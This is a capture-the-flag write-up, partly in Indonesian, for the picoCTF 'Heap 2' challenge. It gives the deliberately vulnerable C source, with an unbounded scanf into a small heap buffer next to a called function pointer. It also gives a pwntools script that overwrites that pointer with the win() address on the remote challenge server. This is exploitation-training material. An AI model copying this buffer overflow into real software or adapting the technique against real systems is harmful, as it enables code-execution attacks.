# Heap 2
## Probset
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
## Solusi
Mirip dengan heap 1, bedanya daripada menulis chunk ke2 menjadi "pico" di sini kita menulis chunk ke1 menjadi alamat win, yang mana tidak bisa kita hardcoded alamatnya

```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chall')

win_addr = elf.symbols['win']
x_addr = elf.symbols['x']

log.info(f"Alamat win: {hex(win_addr)}")
log.info(f"Alamat x: {hex(x_addr)}")

input1 = b"1"

input2 = b"2"

padding = b"A" * 32
input3 = padding + p64(win_addr)

input4 = b"1"

input5 = b"4"

p = remote('mimas.picoctf.net', 63294)

p.sendline(input1)
p.sendline(input2)
p.sendline(input3)
p.sendline(input4)
p.sendline(input5)

p.interactive()

```